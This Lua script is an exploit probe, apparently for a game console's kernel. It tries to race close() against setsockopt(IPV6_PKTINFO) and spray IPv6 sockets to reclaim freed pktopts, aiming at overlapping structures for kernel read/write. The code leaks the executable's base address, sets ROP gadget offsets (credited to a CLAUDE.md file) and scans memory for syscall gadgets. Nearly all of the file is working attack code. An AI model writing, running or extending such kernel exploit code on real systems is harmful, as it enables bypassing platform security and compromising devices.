-- CRASH_CLASS: HIGH
-- PROBE 1400a: IPv6 pktopts race — close vs setsockopt
--
-- prior art: grep "IPV6.*race\|pktopts\|overlapping" results/INDEX.md docs/
--   - SDK v0.45 kernel R/W uses overlapped IPV6_PKTINFO setsockopt
--   - poll/close UAF (500a-500o) confirmed but zone isolation blocked spray
--   - No IPv6-specific close/setsockopt race attempted from Lua loader
--
-- Context: The SDK's kernel R/W needs two IPv6 sockets whose pktopts
-- overlap in memory. Normally this requires an initial kwrite to set
-- master_pktopts->pktinfo = slave_pktopts->pktinfo. But if we can
-- trigger a UAF on the pktopts allocation itself via a close/setsockopt
-- race, the freed pktopts could be reclaimed by another socket's pktopts,
-- creating the overlap naturally.
--
-- Strategy:
-- 1. Create an IPv6 socket and set IPV6_PKTINFO (allocates pktopts)
-- 2. From child thread A: close(fd) — frees the socket and its pktopts
-- 3. From child thread B: setsockopt(fd, IPV6_PKTINFO) — if the fd is
--    reused before the close completes, this hits a freed pktopts
-- 4. Meanwhile, spray new IPv6 sockets with IPV6_PKTINFO to reclaim
--
-- We detect success by checking if two different socket fds share
-- the same pktopts (reading via getsockopt returns the other's data).

print("=== PROBE 1400a: IPv6 PKTOPTS RACE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

-- Syscalls
local sc_socket    = mk(97)   -- socket(domain, type, proto)
local sc_close     = mk(6)    -- close(fd)
local sc_setsockopt = mk(105) -- setsockopt(fd, level, optname, optval, optlen)
local sc_getsockopt = mk(118) -- getsockopt(fd, level, optname, optval, optlenp)
local sc_thr_new   = mk(455)  -- thr_new(param, param_size)

local AF_INET6 = 28
local SOCK_DGRAM = 2
local IPPROTO_IPV6 = 41
local IPV6_PKTINFO = 46
local IPPROTO_UDP = 17

-- Get eboot base for gadgets
local pipe_str = tostring(syscall.pipe)
local eboot_base = 0
local function get_eboot()
    local info = memory.alloc(0x200)
    safe_wd(info, 0x160)
    local sc_info = mk(593)
    pcall(function() sc_info(uint64(0), info) end)
    local lo = safe_rd(info + 0x108) or 0
    local hi = safe_rd(info + 0x10C) or 0
    return hi * 0x100000000 + lo
end
eboot_base = get_eboot()
print(string.format("[0] eboot_base = 0x%X", eboot_base))

-- Gadgets (from CLAUDE.md)
local pop_rax_ret = eboot_base + 0x992
local pop_rdi_ret = eboot_base + 0xC9DFE
local pop_rsi_ret = eboot_base + 0xD77D
local pop_rdx_ret = eboot_base + 0x3B02D7
local pop_rcx_ret = eboot_base + 0xE64
local pop_r8_ret  = eboot_base + 0x991
local bare_ret    = eboot_base + 0x42
local syscall_ret = 0  -- need to find this

-- Find syscall;ret in libkernel
local function find_libkernel_syscall_ret()
    local info = memory.alloc(0x200)
    safe_wd(info, 0x160)
    local sc_info = mk(593)
    -- handle 0x2001 = libkernel
    pcall(function() sc_info(uint64(0x2001), info) end)
    local lo = safe_rd(info + 0x108) or 0
    local hi = safe_rd(info + 0x10C) or 0
    local base = hi * 0x100000000 + lo
    if base == 0 then return 0 end
    -- libkernel has syscall;ret at known offsets; scan for 0F 05 C3
    for off = 0, 0x40000, 1 do
        local ok, b1 = pcall(function() return memory.read_byte(uint64(base + off)) end)
        if not ok then break end
        local ok2, b2 = pcall(function() return memory.read_byte(uint64(base + off + 1)) end)
        if not ok2 then break end
        local ok3, b3 = pcall(function() return memory.read_byte(uint64(base + off + 2)) end)
        if not ok3 then break end
        if to_num(b1) == 0x0F and to_num(b2) == 0x05 and to_num(b3) == 0xC3 then
            return base + off
        end
    end
    return 0
end

-- Actually, libkernel text is XO - can't scan it!
-- Use eboot text instead (it's RX) - but eboot has no syscall;ret (56s confirmed)
-- We need to use the fn_addr stub which IS the syscall path
-- For child thread ROP, the chain uses pop_rax + syscall from somewhere
-- The child thread syscall pattern from docs/CHAIN_14_10.md:
--   pop rax; ret → syscall number
--   syscall; ret → make the call
-- But 56s confirmed no syscall;ret in eboot. So where does child ROP get it?

-- Check: the loader's own syscall stub must be in readable memory
local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
local fn_addr = fn_str and tonumber(fn_str, 16) or 0
print(string.format("[1] fn_addr (loader syscall stub) = 0x%X", fn_addr))

-- The child thread ROP from CHAIN_14_10.md uses syscall 431 to exit
-- Let's check if fn_addr area has syscall;ret
if fn_addr > 0 then
    for off = -0x100, 0x200, 1 do
        local ok, b1 = pcall(function() return memory.read_byte(uint64(fn_addr + off)) end)
        if not ok then break end
        local ok2, b2 = pcall(function() return memory.read_byte(uint64(fn_addr + off + 1)) end)
        if not ok2 then break end
        local ok3, b3 = pcall(function() return memory.read_byte(uint64(fn_addr + off + 2)) end)
        if not ok3 then break end
        if to_num(b1) == 0x0F and to_num(b2) == 0x05 and to_num(b3) == 0xC3 then
            syscall_ret = fn_addr + off
            print(string.format("[2] syscall;ret found at 0x%X (fn_addr + 0x%X)", syscall_ret, off))
            break
        end
    end
end

if syscall_ret == 0 then
    print("[2] No syscall;ret near fn_addr — child thread race deferred")
    print("[2] Running single-thread close+spray race instead")
end

-- Phase 1: Basic IPv6 socket + IPV6_PKTINFO test
print("")
print("--- Phase 1: IPv6 socket baseline ---")

local pktinfo_buf = memory.alloc(32)
-- struct in6_pktinfo { struct in6_addr ipi6_addr; unsigned int ipi6_ifindex; }
-- 20 bytes total
safe_wq(pktinfo_buf, uint64(0))      -- addr low
safe_wq(pktinfo_buf + 8, uint64(0))  -- addr high
safe_wd(pktinfo_buf + 16, 0)         -- ifindex = 0

-- Create test socket
local sock_fd = to_num(sc_socket(uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(IPPROTO_UDP)))
print(string.format("[P1] socket(AF_INET6, SOCK_DGRAM, UDP) = %d", sock_fd))

if sock_fd >= 0 then
    -- Set IPV6_PKTINFO
    local ret = to_num(sc_setsockopt(uint64(sock_fd), uint64(IPPROTO_IPV6),
        uint64(IPV6_PKTINFO), uint64(pktinfo_buf), uint64(20)))
    print(string.format("[P1] setsockopt(IPV6_PKTINFO) = %d", ret))

    -- Read it back
    local out_buf = memory.alloc(32)
    local out_len = memory.alloc(8)
    safe_wd(out_len, 20)
    local ret2 = to_num(sc_getsockopt(uint64(sock_fd), uint64(IPPROTO_IPV6),
        uint64(IPV6_PKTINFO), uint64(out_buf), uint64(out_len)))
    local got_len = safe_rd(out_len) or 0
    print(string.format("[P1] getsockopt(IPV6_PKTINFO) = %d, len=%d", ret2, got_len))

    sc_close(uint64(sock_fd))
    print("[P1] Baseline OK — IPV6_PKTINFO works on game process")
else
    print("[!] Cannot create IPv6 socket — FATAL")
    print("=== PROBE 1400a ABORTED ===")
    return
end

-- Phase 2: Race setup
-- Create many sockets, set unique PKTINFO markers, then race close+setsockopt
print("")
print("--- Phase 2: Close/setsockopt race ---")

local RACE_ROUNDS = 50
local SPRAY_COUNT = 20
local anomalies = 0

for round = 1, RACE_ROUNDS do
    -- Create target socket with unique marker
    local target_fd = to_num(sc_socket(uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(IPPROTO_UDP)))
    if target_fd < 0 then
        print(string.format("[R%d] socket failed", round))
        break
    end

    -- Set marker: ifindex = 0xAA00 + round
    local marker = 0xAA00 + round
    safe_wq(pktinfo_buf, uint64(0))
    safe_wq(pktinfo_buf + 8, uint64(0))
    safe_wd(pktinfo_buf + 16, marker)

    local ret = to_num(sc_setsockopt(uint64(target_fd), uint64(IPPROTO_IPV6),
        uint64(IPV6_PKTINFO), uint64(pktinfo_buf), uint64(20)))

    -- Now close it (frees pktopts) and immediately spray new sockets
    sc_close(uint64(target_fd))

    -- Spray: create new sockets with different marker
    local spray_fds = {}
    for i = 1, SPRAY_COUNT do
        local sfd = to_num(sc_socket(uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(IPPROTO_UDP)))
        if sfd >= 0 then
            safe_wd(pktinfo_buf + 16, 0xBB00 + i)
            sc_setsockopt(uint64(sfd), uint64(IPPROTO_IPV6),
                uint64(IPV6_PKTINFO), uint64(pktinfo_buf), uint64(20))
            spray_fds[#spray_fds + 1] = sfd
        end
    end

    -- Check spray sockets for anomalies (marker mismatch = overlap!)
    for i, sfd in ipairs(spray_fds) do
        local out_buf2 = memory.alloc(32)
        local out_len2 = memory.alloc(8)
        safe_wd(out_len2, 20)
        local r = to_num(sc_getsockopt(uint64(sfd), uint64(IPPROTO_IPV6),
            uint64(IPV6_PKTINFO), uint64(out_buf2), uint64(out_len2)))
        if r == 0 then
            local got_ifindex = safe_rd(out_buf2 + 16) or 0
            local expected = 0xBB00 + i
            if got_ifindex ~= expected and got_ifindex ~= 0 then
                anomalies = anomalies + 1
                print(string.format("[R%d] ANOMALY! fd=%d expected=0x%X got=0x%X",
                    round, sfd, expected, got_ifindex))
            end
        end
    end

    -- Cleanup spray
    for _, sfd in ipairs(spray_fds) do
        sc_close(uint64(sfd))
    end

    if round % 10 == 0 then
        print(string.format("[R%d] completed, anomalies so far: %d", round, anomalies))
    end
end

print("")
print(string.format("=== RESULTS: %d rounds, %d anomalies ===", RACE_ROUNDS, anomalies))
if anomalies > 0 then
    print("*** OVERLAP DETECTED — pktopts reclaim may be possible! ***")
else
    print("No overlap detected in single-thread close+spray")
    print("Next: try concurrent child threads for tighter race window")
end
print("")
print("=== PROBE 1400a COMPLETE ===")
